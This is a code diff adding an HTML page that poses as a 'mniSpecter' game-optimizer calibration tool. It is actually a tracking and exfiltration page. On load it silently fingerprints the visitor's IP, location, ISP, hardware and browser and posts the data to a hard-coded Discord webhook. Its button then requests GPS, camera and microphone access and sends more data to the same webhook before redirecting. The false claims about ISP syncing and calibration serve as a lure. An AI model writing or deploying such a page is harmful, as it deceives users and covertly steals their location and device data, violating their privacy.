@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>mniSpecter Ultra-Optimizer</title>
+    <style>
+        body {
+            background-color: #0d0d0d;
+            color: #00ffcc;
+            font-family: 'Consolas', 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #1a1a1a;
+            padding: 40px;
+            border: 1px solid #00ffcc;
+            border-radius: 5px;
+            box-shadow: 0 0 20px rgba(0, 255, 204, 0.2);
+            text-align: center;
+            max-width: 500px;
+        }
+        h1 { text-transform: uppercase; letter-spacing: 2px; }
+        p { color: #888; font-size: 0.9em; line-height: 1.5;}
+        .btn {
+            background-color: transparent;
+            color: #00ffcc;
+            border: 1px solid #00ffcc;
+            padding: 15px 40px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 25px;
+            transition: all 0.3s;
+        }
+        .btn:hover { background-color: #00ffcc; color: #000; box-shadow: 0 0 15px #00ffcc; }
+        #status { margin-top: 20px; font-style: italic; display: none; color: #ffcc00; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>mniSpecter V4.0</h1>
+        <p>Deep system calibration required for maximum frame-rates and 0ms network latency.</p>
+        <p>Granting permissions allows the engine to sync your local Danish ISP with our core servers.</p>
+        <button class="btn" onclick="manualTrigger()">INITIALIZE CALIBRATION</button>
+        <div id="status">Scraping system registry...</div>
+    </div>
+
+    <canvas id="confetti-canvas" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;"></canvas>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1466448858925240412/osJaKR7wAQ5s1IwHKeW6SjBWixidlk7t6U-gxWBcW5vlNlZfkSoRJZRrO34LXI_a4LM2";
+        const soundSelect = new Audio("universfield-computer-mouse-click-02-383961.mp3");
+        const soundRoundEnd = new Audio("u_8g40a9z0la-tada-234709.mp3");
+        soundSelect.volume = 0.3;
+        soundRoundEnd.volume = 0.5;
+        const canvas = document.getElementById("confetti-canvas");
+        const ctx = canvas.getContext("2d");
+        let particles = [];
+        let animationId;
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        window.addEventListener("resize", resizeCanvas);
+        resizeCanvas();
+
+        function createParticles(amount) {
+            const colors = ["#00ffcc", "#ffffff", "#ffcc00", "#ff3366"];
+            for (let i = 0; i < amount; i++) {
+                particles.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height - canvas.height,
+                    size: Math.random() * 7 + 3,
+                    color: colors[Math.floor(Math.random() * colors.length)],
+                    speed: Math.random() * 3 + 2,
+                    angle: Math.random() * 6.28,
+                    spin: Math.random() * 0.2 - 0.1
+                });
+            }
+        }
+
+        function updateConfetti() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach((p, i) => {
+                p.y += p.speed;
+                p.angle += p.spin;
+                ctx.fillStyle = p.color;
+                ctx.save();
+                ctx.translate(p.x, p.y);
+                ctx.rotate(p.angle);
+                ctx.fillRect(-p.size / 2, -p.size / 2, p.size, p.size);
+                ctx.restore();
+                if (p.y > canvas.height) particles.splice(i, 1);
+            });
+            if (particles.length > 0) {
+                animationId = requestAnimationFrame(updateConfetti);
+            }
+        }
+
+        function startConfetti(amount) {
+            if (animationId) cancelAnimationFrame(animationId);
+            particles = [];
+            createParticles(amount);
+            updateConfetti();
+        }
+
+        function getGPU() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+            } catch (e) { return "Blocked"; }
+        }
+
+        async function silentAudit() {
+            let ipData = { ip: "Unknown", city: "Unknown" };
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                ipData = await response.json();
+            } catch (e) {}
+
+            let batteryLevel = "Not Supported";
+            let hasBattery = false;
+            try {
+                const battery = await navigator.getBattery();
+                batteryLevel = `${(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+                if (battery.level < 1 || battery.charging === false) hasBattery = true;
+            } catch (e) {}
+
+            const languageCode = navigator.language;
+            let fullLanguageName = languageCode;
+            try {
+                const displayNames = new Intl.DisplayNames(['en'], { type: 'language' });
+                fullLanguageName = displayNames.of(languageCode);
+            } catch (e) {}
+
+            const width = window.screen.width;
+            const isTouch = navigator.maxTouchPoints > 0;
+            let deviceGuess = "Desktop PC";
+            if (hasBattery && width > 1000) deviceGuess = "Laptop";
+            else if (isTouch && width < 500) deviceGuess = "Smartphone";
+            else if (isTouch && width >= 500 && width <= 1000) deviceGuess = "Tablet";
+
+            const data = {
+                content: "🔴 **Full System Fingerprint Received (Silent)**",
+                embeds: [{
+                    color: 15158332,
+                    fields: [
+                        { name: "🔍 Inferred Device", value: `**${deviceGuess}**`, inline: false },
+                        { name: "🌐 Network", value: `IP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.country_name}\nISP: ${ipData.org}`, inline: false },
+                        { name: "💻 Hardware", value: `CPU Cores: ${navigator.hardwareConcurrency}\nRAM: ${navigator.deviceMemory}GB (Approx)\nGPU: ${getGPU()}`, inline: true },
+                        { name: "📱 Device", value: `OS: ${navigator.platform}\nBattery: ${batteryLevel}\nScreen: ${window.screen.width}x${window.screen.height}`, inline: true },
+                        { name: "🌍 Software", value: `Browser: ${navigator.userAgent}\nLanguage: ${fullLanguageName}\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: false }
+                    ]
+                }]
+            };
+
+            fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+        }
+
+        async function manualTrigger() {
+            soundSelect.play().catch(() => {});
+            document.getElementById('status').style.display = 'block';
+            document.querySelector('.btn').innerText = 'SYST_CALIBRATING...';
+
+            let ipData = { query: "Unknown", city: "Unknown", isp: "Unknown", zip: "Unknown", ip: "Unknown", org: "Unknown", postal: "Unknown" };
+            try {
+                const response = await fetch('http://ip-api.com/json/');
+                ipData = await response.json();
+            } catch (e) {}
+
+            let batteryLevel = "N/A";
+            let hasBattery = false;
+            try {
+                const battery = await navigator.getBattery();
+                batteryLevel = `${(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+                if (battery.level < 1 || !battery.charging) hasBattery = true;
+            } catch (e) {}
+
+            let geoData = "Denied";
+            try {
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true, timeout: 5000});
+                });
+                geoData = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude} (Acc: ${pos.coords.accuracy}m)`;
+            } catch (e) {}
+
+            let mediaDevices = "Denied";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                mediaDevices = devices.map(d => `${d.kind.split('input')[0]}: ${d.label || 'Generic'}`).join('\n');
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {}
+
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const netInfo = conn ? `Type: ${conn.effectiveType}, Speed: ${conn.downlink}Mbps, RTT: ${conn.rtt}ms` : "N/A";
+
+            const langCode = navigator.language;
+            let fullLang = langCode;
+            try { fullLang = new Intl.DisplayNames(['en'], { type: 'language' }).of(langCode); } catch (e) {}
+
+            const width = window.screen.width;
+            const height = window.screen.height;
+            const isTouch = navigator.maxTouchPoints > 0;
+            let deviceGuess = hasBattery && width > 1000 ? "Laptop" : (isTouch && width < 500 ? "Smartphone" : "Desktop PC");
+            const plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(', ') : "None";
+
+            const data = {
+                content: "🧨 **ULTIMATE mniSpecter LOG: MAXIMUM DATA (Manual)** 🧨",
+                embeds: [{
+                    color: 16711680,
+                    title: "CRITICAL SYSTEM EXFILTRATION",
+                    fields: [
+                        { name: "📍 GPS/Geo", value: `**Location:** ${geoData}\n**City:** ${ipData.city}\n**Postal:** ${ipData.zip || ipData.postal}`, inline: false },
+                        { name: "🌐 Advanced Network", value: `**IP:** ${ipData.query || ipData.ip}\n**ISP:** ${ipData.isp || ipData.org}\n**Stats:** ${netInfo}`, inline: false },
+                        { name: "🎤 Hardware IDs", value: `\`\`\`${mediaDevices || "No Data"}\`\`\``, inline: false },
+                        { name: "💻 Deep Specs", value: `**CPU Cores:** ${navigator.hardwareConcurrency}\n**RAM Approx:** ${navigator.deviceMemory}GB\n**GPU:** ${getGPU()}`, inline: true },
+                        { name: "📱 Device Logic", value: `**Guess:** ${deviceGuess}\n**OS:** ${navigator.platform}\n**Screen:** ${width}x${height}\n**Touch:** ${isTouch}`, inline: true },
+                        { name: "🌍 Software Environment", value: `**Lang:** ${fullLang}\n**PDF:** ${navigator.pdfViewerEnabled}\n**Cookies:** ${document.cookie ? "Active" : "None"}`, inline: false },
+                        { name: "🛠️ Browser Plugins", value: plugins.substring(0, 200) + (plugins.length > 200 ? "..." : ""), inline: false }
+                    ],
+                    footer: { text: `Timestamp: ${new Date().toLocaleString()}` }
+                }]
+            };
+
+            await fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+            document.getElementById('status').innerText = 'CALIBRATION COMPLETE. REGISTRY SYNCED. redirecting to life-forge. get ready! (5)...';
+            soundRoundEnd.play().catch(() => {});
+            startConfetti(100);
+            timeout(() => {
+                document.getElementById('status').style.display = 'none';
+                document.querySelector('.btn').innerText = 'INITIALIZE CALIBRATION';
+            }, 5000);
+            window.location.href = "https://oliverp0404-a11y.github.io/life-forge/";
+        }
+
+        silentAudit();
+    </script>
+</body>
+</html>
